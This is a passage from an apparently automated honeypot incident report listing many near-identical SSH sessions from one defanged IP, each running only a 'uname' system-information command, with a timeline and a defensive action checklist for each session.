| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:55` | `cowrie.session.connect` |
| `2026-08-08 17:10:55` | `cowrie.client.version` |
| `2026-08-08 17:10:55` | `cowrie.client.kex` |
| `2026-08-08 17:10:55` | `cowrie.login.success` |
| `2026-08-08 17:10:56` | `cowrie.session.params` |
| `2026-08-08 17:10:56` | `cowrie.command.input` |
| `2026-08-08 17:10:57` | `cowrie.log.closed` |
| `2026-08-08 17:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722eb90738ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:01` | `cowrie.session.connect` |
| `2026-08-08 17:11:01` | `cowrie.client.version` |
| `2026-08-08 17:11:01` | `cowrie.client.kex` |
| `2026-08-08 17:11:02` | `cowrie.login.success` |
| `2026-08-08 17:11:03` | `cowrie.session.params` |
| `2026-08-08 17:11:03` | `cowrie.command.input` |
| `2026-08-08 17:11:03` | `cowrie.log.closed` |
| `2026-08-08 17:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79aec7a3eec0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:06` | `cowrie.session.connect` |
| `2026-08-08 17:11:07` | `cowrie.client.version` |
| `2026-08-08 17:11:07` | `cowrie.client.kex` |
| `2026-08-08 17:11:08` | `cowrie.login.success` |
| `2026-08-08 17:11:09` | `cowrie.session.params` |
| `2026-08-08 17:11:09` | `cowrie.command.input` |
| `2026-08-08 17:11:09` | `cowrie.log.closed` |
| `2026-08-08 17:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb38a18589f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:13` | `cowrie.session.connect` |
| `2026-08-08 17:11:14` | `cowrie.client.version` |
| `2026-08-08 17:11:14` | `cowrie.client.kex` |
| `2026-08-08 17:11:15` | `cowrie.login.success` |
| `2026-08-08 17:11:16` | `cowrie.session.params` |
| `2026-08-08 17:11:16` | `cowrie.command.input` |
| `2026-08-08 17:11:16` | `cowrie.log.closed` |
| `2026-08-08 17:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95388deb7a53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:21` | `cowrie.session.connect` |
| `2026-08-08 17:11:21` | `cowrie.client.version` |
| `2026-08-08 17:11:21` | `cowrie.client.kex` |
| `2026-08-08 17:11:22` | `cowrie.login.success` |
| `2026-08-08 17:11:22` | `cowrie.session.params` |
| `2026-08-08 17:11:22` | `cowrie.command.input` |
| `2026-08-08 17:11:23` | `cowrie.log.closed` |
| `2026-08-08 17:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501c353a5753

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:27` | `cowrie.session.connect` |
| `2026-08-08 17:11:27` | `cowrie.client.version` |
| `2026-08-08 17:11:28` | `cowrie.client.kex` |
| `2026-08-08 17:11:28` | `cowrie.login.success` |
| `2026-08-08 17:11:29` | `cowrie.session.params` |
| `2026-08-08 17:11:29` | `cowrie.command.input` |
| `2026-08-08 17:11:30` | `cowrie.log.closed` |
| `2026-08-08 17:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c66db1f4ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:34` | `cowrie.session.connect` |
| `2026-08-08 17:11:34` | `cowrie.client.version` |
| `2026-08-08 17:11:35` | `cowrie.client.kex` |
| `2026-08-08 17:11:35` | `cowrie.login.success` |
| `2026-08-08 17:11:36` | `cowrie.session.params` |
| `2026-08-08 17:11:36` | `cowrie.command.input` |
| `2026-08-08 17:11:36` | `cowrie.log.closed` |
| `2026-08-08 17:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e3f1c4bbef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:42` | `cowrie.session.connect` |
| `2026-08-08 17:11:42` | `cowrie.client.version` |
| `2026-08-08 17:11:42` | `cowrie.client.kex` |
| `2026-08-08 17:11:42` | `cowrie.login.success` |
| `2026-08-08 17:11:43` | `cowrie.session.params` |
| `2026-08-08 17:11:43` | `cowrie.command.input` |
| `2026-08-08 17:11:43` | `cowrie.log.closed` |
| `2026-08-08 17:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8908bbf749

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:47` | `cowrie.session.connect` |
| `2026-08-08 17:11:47` | `cowrie.client.version` |
| `2026-08-08 17:11:47` | `cowrie.client.kex` |
| `2026-08-08 17:11:48` | `cowrie.login.success` |
| `2026-08-08 17:11:49` | `cowrie.session.params` |
| `2026-08-08 17:11:49` | `cowrie.command.input` |
| `2026-08-08 17:11:49` | `cowrie.log.closed` |
| `2026-08-08 17:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5584947dd90e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:53` | `cowrie.session.connect` |
| `2026-08-08 17:11:53` | `cowrie.client.version` |
| `2026-08-08 17:11:53` | `cowrie.client.kex` |
| `2026-08-08 17:11:54` | `cowrie.login.success` |
| `2026-08-08 17:11:55` | `cowrie.session.params` |
| `2026-08-08 17:11:55` | `cowrie.command.input` |
| `2026-08-08 17:11:55` | `cowrie.log.closed` |
| `2026-08-08 17:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85de525f0bef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:11 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:11:59` | `cowrie.session.connect` |
| `2026-08-08 17:11:59` | `cowrie.client.version` |
| `2026-08-08 17:11:59` | `cowrie.client.kex` |
| `2026-08-08 17:12:00` | `cowrie.login.success` |
| `2026-08-08 17:12:00` | `cowrie.session.params` |
| `2026-08-08 17:12:00` | `cowrie.command.input` |
| `2026-08-08 17:12:00` | `cowrie.log.closed` |
| `2026-08-08 17:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08ba5603e96

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:05` | `cowrie.session.connect` |
| `2026-08-08 17:12:05` | `cowrie.client.version` |
| `2026-08-08 17:12:05` | `cowrie.client.kex` |
| `2026-08-08 17:12:06` | `cowrie.login.success` |
| `2026-08-08 17:12:07` | `cowrie.session.params` |
| `2026-08-08 17:12:07` | `cowrie.command.input` |
| `2026-08-08 17:12:07` | `cowrie.log.closed` |
| `2026-08-08 17:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63072fb2e54b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:11` | `cowrie.session.connect` |
| `2026-08-08 17:12:11` | `cowrie.client.version` |
| `2026-08-08 17:12:11` | `cowrie.client.kex` |
| `2026-08-08 17:12:12` | `cowrie.login.success` |
| `2026-08-08 17:12:13` | `cowrie.session.params` |
| `2026-08-08 17:12:13` | `cowrie.command.input` |
| `2026-08-08 17:12:14` | `cowrie.log.closed` |
| `2026-08-08 17:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da881ac96cca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:17` | `cowrie.session.connect` |
| `2026-08-08 17:12:17` | `cowrie.client.version` |
| `2026-08-08 17:12:17` | `cowrie.client.kex` |
| `2026-08-08 17:12:18` | `cowrie.login.success` |
| `2026-08-08 17:12:19` | `cowrie.session.params` |
| `2026-08-08 17:12:19` | `cowrie.command.input` |
| `2026-08-08 17:12:19` | `cowrie.log.closed` |
| `2026-08-08 17:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f8b1c4778ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:23` | `cowrie.session.connect` |
| `2026-08-08 17:12:23` | `cowrie.client.version` |
| `2026-08-08 17:12:24` | `cowrie.client.kex` |
| `2026-08-08 17:12:24` | `cowrie.login.success` |
| `2026-08-08 17:12:25` | `cowrie.session.params` |
| `2026-08-08 17:12:25` | `cowrie.command.input` |
| `2026-08-08 17:12:25` | `cowrie.log.closed` |
| `2026-08-08 17:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d636d61c7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:29` | `cowrie.session.connect` |
| `2026-08-08 17:12:29` | `cowrie.client.version` |
| `2026-08-08 17:12:29` | `cowrie.client.kex` |
| `2026-08-08 17:12:30` | `cowrie.login.success` |
| `2026-08-08 17:12:31` | `cowrie.session.params` |
| `2026-08-08 17:12:31` | `cowrie.command.input` |
| `2026-08-08 17:12:31` | `cowrie.log.closed` |
| `2026-08-08 17:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07009b282115

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:35` | `cowrie.session.connect` |
| `2026-08-08 17:12:35` | `cowrie.client.version` |
| `2026-08-08 17:12:35` | `cowrie.client.kex` |
| `2026-08-08 17:12:36` | `cowrie.login.success` |
| `2026-08-08 17:12:37` | `cowrie.session.params` |
| `2026-08-08 17:12:37` | `cowrie.command.input` |
| `2026-08-08 17:12:37` | `cowrie.log.closed` |
| `2026-08-08 17:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e899f613357b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:41` | `cowrie.session.connect` |
| `2026-08-08 17:12:41` | `cowrie.client.version` |
| `2026-08-08 17:12:41` | `cowrie.client.kex` |
| `2026-08-08 17:12:42` | `cowrie.login.success` |
| `2026-08-08 17:12:43` | `cowrie.session.params` |
| `2026-08-08 17:12:43` | `cowrie.command.input` |
| `2026-08-08 17:12:43` | `cowrie.log.closed` |
| `2026-08-08 17:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56004cd2b98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:47` | `cowrie.session.connect` |
| `2026-08-08 17:12:47` | `cowrie.client.version` |
| `2026-08-08 17:12:47` | `cowrie.client.kex` |
| `2026-08-08 17:12:48` | `cowrie.login.success` |
| `2026-08-08 17:12:49` | `cowrie.session.params` |
| `2026-08-08 17:12:49` | `cowrie.command.input` |
| `2026-08-08 17:12:49` | `cowrie.log.closed` |
| `2026-08-08 17:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811770bfcb61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:53` | `cowrie.session.connect` |
| `2026-08-08 17:12:53` | `cowrie.client.version` |
| `2026-08-08 17:12:53` | `cowrie.client.kex` |
| `2026-08-08 17:12:54` | `cowrie.login.success` |
| `2026-08-08 17:12:55` | `cowrie.session.params` |
| `2026-08-08 17:12:55` | `cowrie.command.input` |
| `2026-08-08 17:12:56` | `cowrie.log.closed` |
| `2026-08-08 17:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad75af75a98b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:12 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:12:58` | `cowrie.session.connect` |
| `2026-08-08 17:12:59` | `cowrie.client.version` |
| `2026-08-08 17:12:59` | `cowrie.client.kex` |
| `2026-08-08 17:13:00` | `cowrie.login.success` |
| `2026-08-08 17:13:02` | `cowrie.session.params` |
| `2026-08-08 17:13:02` | `cowrie.command.input` |
| `2026-08-08 17:13:02` | `cowrie.log.closed` |
| `2026-08-08 17:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c4099c4374

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:05` | `cowrie.session.connect` |
| `2026-08-08 17:13:05` | `cowrie.client.version` |
| `2026-08-08 17:13:05` | `cowrie.client.kex` |
| `2026-08-08 17:13:05` | `cowrie.login.success` |
| `2026-08-08 17:13:06` | `cowrie.session.params` |
| `2026-08-08 17:13:06` | `cowrie.command.input` |
| `2026-08-08 17:13:06` | `cowrie.log.closed` |
| `2026-08-08 17:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40318887a67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:10` | `cowrie.session.connect` |
| `2026-08-08 17:13:10` | `cowrie.client.version` |
| `2026-08-08 17:13:10` | `cowrie.client.kex` |
| `2026-08-08 17:13:11` | `cowrie.login.success` |
| `2026-08-08 17:13:12` | `cowrie.session.params` |
| `2026-08-08 17:13:12` | `cowrie.command.input` |
| `2026-08-08 17:13:13` | `cowrie.log.closed` |
| `2026-08-08 17:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2930e506a44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:16` | `cowrie.session.connect` |
| `2026-08-08 17:13:16` | `cowrie.client.version` |
| `2026-08-08 17:13:16` | `cowrie.client.kex` |
| `2026-08-08 17:13:17` | `cowrie.login.success` |
| `2026-08-08 17:13:18` | `cowrie.session.params` |
| `2026-08-08 17:13:18` | `cowrie.command.input` |
| `2026-08-08 17:13:18` | `cowrie.log.closed` |
| `2026-08-08 17:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea3cff98910

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:22` | `cowrie.session.connect` |
| `2026-08-08 17:13:22` | `cowrie.client.version` |
| `2026-08-08 17:13:22` | `cowrie.client.kex` |
| `2026-08-08 17:13:23` | `cowrie.login.success` |
| `2026-08-08 17:13:24` | `cowrie.session.params` |
| `2026-08-08 17:13:24` | `cowrie.command.input` |
| `2026-08-08 17:13:24` | `cowrie.log.closed` |
| `2026-08-08 17:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29f31c20d67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:28` | `cowrie.session.connect` |
| `2026-08-08 17:13:28` | `cowrie.client.version` |
| `2026-08-08 17:13:28` | `cowrie.client.kex` |
| `2026-08-08 17:13:29` | `cowrie.login.success` |
| `2026-08-08 17:13:30` | `cowrie.session.params` |
| `2026-08-08 17:13:30` | `cowrie.command.input` |
| `2026-08-08 17:13:30` | `cowrie.log.closed` |
